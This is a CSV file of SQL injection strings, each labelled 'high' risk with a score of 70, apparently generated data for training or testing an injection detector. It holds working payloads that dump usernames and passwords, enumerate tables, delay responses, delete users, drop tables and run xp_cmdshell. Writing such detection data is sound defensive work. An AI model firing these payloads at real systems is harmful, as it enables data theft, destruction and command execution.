query,risk,score
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # kh",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; DROP PROCEDURE admin_login-- -- m,high,70
' OR 1=1; DROP TABLE temp; -- -- b,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # gc,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 97",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
'; DROP PROCEDURE admin_login-- -- 2,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 9,high,70
'; DROP PROCEDURE admin_login-- -- q,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # b7",high,70
' OR SLEEP(5) AND '1'='1 # 45,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- l,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # yt,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # ug,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; DROP PROCEDURE admin_login-- -- d,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- h",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- a,high,70
'; WAITFOR DELAY '0:0:5'-- -- r,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # dw,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
' OR 1=1; DROP TABLE temp; -- -- f,high,70
'; DELETE FROM users; /**/ -- e,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- i",high,70
'; WAITFOR DELAY '0:0:5'-- # ta,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- z",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- k",high,70
"' UNION ALL SELECT username, password FROM users -- h",high,70
'; DELETE FROM users; /**/ /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # br,high,70
' OR 1=1; DROP TABLE temp; -- -- p,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- p",high,70
' OR SLEEP(5) AND '1'='1 -- s,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # rm,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # sf,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # ix",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- m,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # f4,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; WAITFOR DELAY '0:0:5'-- # ob,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 9t,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- h,high,70
' OR 1=1; DROP TABLE temp; -- # oi,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # nl,high,70
' OR 1=1; DROP TABLE temp; -- # pj,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 5u",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
'; DROP PROCEDURE admin_login-- -- t,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DROP PROCEDURE admin_login-- -- 4,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/,high,70
' OR 1=1; DROP TABLE temp; -- # gp,high,70
' OR 1=1; DROP TABLE temp; -- -- v,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- l",high,70
'; DELETE FROM users; /**/ /**/,high,70
"' UNION ALL SELECT username, password FROM users -- 3",high,70
'; WAITFOR DELAY '0:0:5'-- -- 8,high,70
'; DROP PROCEDURE admin_login-- -- 5,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DROP PROCEDURE admin_login-- -- z,high,70
' OR 1=1; DROP TABLE temp; -- -- k,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 0v,high,70
'; WAITFOR DELAY '0:0:5'-- -- n,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # z8,high,70
'; SELECT pg_sleep(5); -- -- 9,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- l",high,70
"' UNION ALL SELECT username, password FROM users -- k",high,70
'; DELETE FROM users; /**/ # 4x,high,70
"' UNION ALL SELECT username, password FROM users # ta",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; DELETE FROM users; /**/ /**/,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DROP PROCEDURE admin_login-- -- v,high,70
' OR SLEEP(5) AND '1'='1 -- h,high,70
"' UNION ALL SELECT username, password FROM users -- k",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 00",high,70
' OR SLEEP(5) AND '1'='1 # so,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 4",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 9,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 7",high,70
' OR 1=1; DROP TABLE temp; -- -- e,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # fu,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- z,high,70
'; DROP PROCEDURE admin_login-- -- d,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- k,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 3,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # ei,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 95",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 5,high,70
'; DROP PROCEDURE admin_login-- # do,high,70
"' UNION ALL SELECT username, password FROM users # 2s",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- h",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/,high,70
' OR SLEEP(5) AND '1'='1 -- a,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 4b,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- i",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- x",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # yb",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 2,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- j",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- y",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # en,high,70
"' UNION ALL SELECT username, password FROM users # xs",high,70
' OR SLEEP(5) AND '1'='1 -- f,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- e",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
' OR SLEEP(5) AND '1'='1 -- j,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # ql",high,70
'; DELETE FROM users; /**/ -- 4,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; SELECT pg_sleep(5); -- # v4,high,70
'; SELECT pg_sleep(5); -- -- p,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # vy,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 1p,high,70
' OR 1=1; DROP TABLE temp; -- # h9,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 3,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; DROP PROCEDURE admin_login-- -- i,high,70
' OR 1=1; DROP TABLE temp; -- # 6l,high,70
'; DELETE FROM users; /**/ -- v,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # xf,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- x",high,70
' OR SLEEP(5) AND '1'='1 # 85,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DROP PROCEDURE admin_login-- # bq,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- v",high,70
'; DELETE FROM users; /**/ # n5,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 9,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
' OR SLEEP(5) AND '1'='1 # 4i,high,70
'; WAITFOR DELAY '0:0:5'-- # oi,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- x,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 6",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; WAITFOR DELAY '0:0:5'-- -- q,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # qj",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- j",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- u,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- 3",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # pb",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 0",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 21,high,70
' OR SLEEP(5) AND '1'='1 # o4,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- z,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- p,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
'; WAITFOR DELAY '0:0:5'-- -- r,high,70
'; DELETE FROM users; /**/ -- 8,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # kx",high,70
' OR SLEEP(5) AND '1'='1 -- x,high,70
"' UNION ALL SELECT username, password FROM users # j2",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- m",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 6p,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # f1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- i",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/,high,70
'; DROP PROCEDURE admin_login-- # zp,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; DROP PROCEDURE admin_login-- -- w,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- z,high,70
'; DELETE FROM users; /**/ -- u,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # ff,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # ve,high,70
'; DELETE FROM users; /**/ -- f,high,70
' OR SLEEP(5) AND '1'='1 # or,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 8d",high,70
'; DROP PROCEDURE admin_login-- # 0h,high,70
'; DROP PROCEDURE admin_login-- -- s,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # fe",high,70
'; WAITFOR DELAY '0:0:5'-- -- 8,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- c",high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- f,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- 2",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # eg",high,70
'; DELETE FROM users; /**/ /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # pl",high,70
' OR 1=1; DROP TABLE temp; -- # bs,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- k",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # t6",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- o,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # mu,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # hf",high,70
' OR SLEEP(5) AND '1'='1 # xw,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # q5",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- f",high,70
'; DROP PROCEDURE admin_login-- # 4m,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- s,high,70
'; DELETE FROM users; /**/ /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # w0",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # ra,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
"' UNION ALL SELECT username, password FROM users # tl",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; DELETE FROM users; /**/ /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- w,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- w,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # d8",high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
' OR SLEEP(5) AND '1'='1 -- g,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # sf,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # te",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; SELECT pg_sleep(5); -- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- w",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # fo,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- c,high,70
'; WAITFOR DELAY '0:0:5'-- # nu,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- e",high,70
"' UNION ALL SELECT username, password FROM users # 1u",high,70
'; WAITFOR DELAY '0:0:5'-- -- b,high,70
'; DELETE FROM users; /**/ -- x,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 3",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- s,high,70
' OR 1=1; DROP TABLE temp; -- # ux,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # qg",high,70
'; DROP PROCEDURE admin_login-- # fb,high,70
'; DROP PROCEDURE admin_login-- # gx,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # hw,high,70
'; DROP PROCEDURE admin_login-- -- b,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # ql",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- t,high,70
'; WAITFOR DELAY '0:0:5'-- -- 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # b4,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # fl,high,70
' OR 1=1; DROP TABLE temp; -- -- c,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DELETE FROM users; /**/ -- 4,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
"' UNION ALL SELECT username, password FROM users # k5",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # p0,high,70
' OR SLEEP(5) AND '1'='1 -- c,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DELETE FROM users; /**/ -- g,high,70
'; DELETE FROM users; /**/ /**/,high,70
' OR SLEEP(5) AND '1'='1 -- s,high,70
'; WAITFOR DELAY '0:0:5'-- -- q,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; DELETE FROM users; /**/ /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; DELETE FROM users; /**/ /**/,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; DROP PROCEDURE admin_login-- # sw,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 2,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
"' UNION ALL SELECT username, password FROM users # ew",high,70
'; DROP PROCEDURE admin_login-- # y1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
"' UNION ALL SELECT username, password FROM users -- c",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 57",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # uh,high,70
' OR 1=1; DROP TABLE temp; -- -- v,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
' OR 1=1; DROP TABLE temp; -- # 4x,high,70
'; WAITFOR DELAY '0:0:5'-- # 61,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- r,high,70
' OR 1=1; DROP TABLE temp; -- -- i,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
"' UNION ALL SELECT username, password FROM users -- 6",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 5,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 6t,high,70
'; WAITFOR DELAY '0:0:5'-- -- 4,high,70
'; DROP PROCEDURE admin_login-- -- f,high,70
'; DELETE FROM users; /**/ -- 3,high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- i,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # js,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- t",high,70
' OR SLEEP(5) AND '1'='1 -- b,high,70
'; DROP PROCEDURE admin_login-- -- 3,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- c,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 3",high,70
' OR 1=1; DROP TABLE temp; -- -- h,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; DROP PROCEDURE admin_login-- -- 0,high,70
' OR 1=1; DROP TABLE temp; -- # k9,high,70
' OR SLEEP(5) AND '1'='1 # jr,high,70
'; DROP PROCEDURE admin_login-- -- j,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # g3,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- a,high,70
' OR 1=1; DROP TABLE temp; -- -- 8,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # ii",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- pdno09,high,70
' OR 1=1; DROP TABLE temp; -- # h60xe06,high,70
'; SELECT pg_sleep(5); -- # zf58ftp,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # jxohnmm",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # pff5mxb,high,70
'; DROP PROCEDURE admin_login-- -- iwvz9h,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 7dz2h8l",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
' OR 1=1; DROP TABLE temp; -- -- ata0d7,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- i8ejn3,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- 3ith1o,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- gec0xz",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ -- w",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ /**/,high,70
'; DELETE FROM users; /**/ LIMIT 1 -- ,high,70
'; DELETE FROM users; /**/ # qkv6qz6,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
' OR SLEEP(5) AND '1'='1 # jf491oq,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; DELETE FROM users; /**/ -- w514tn,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DELETE FROM users; /**/ /**/ # 4v,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # oyt6a1b",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- vgdlpo",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ /**/",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # fwkm46r,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- s",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
' OR 1=1; DROP TABLE temp; -- -- 0pe96j,high,70
' OR 1=1; DROP TABLE temp; -- /**/ # f9,high,70
'; DELETE FROM users; /**/ LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- /**/ # z7,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ -- h,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
'; DELETE FROM users; /**/ -- svswfm,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # 37,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 3x04lvw",high,70
'; SELECT pg_sleep(5); -- # b87m712,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # 82,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # gz,high,70
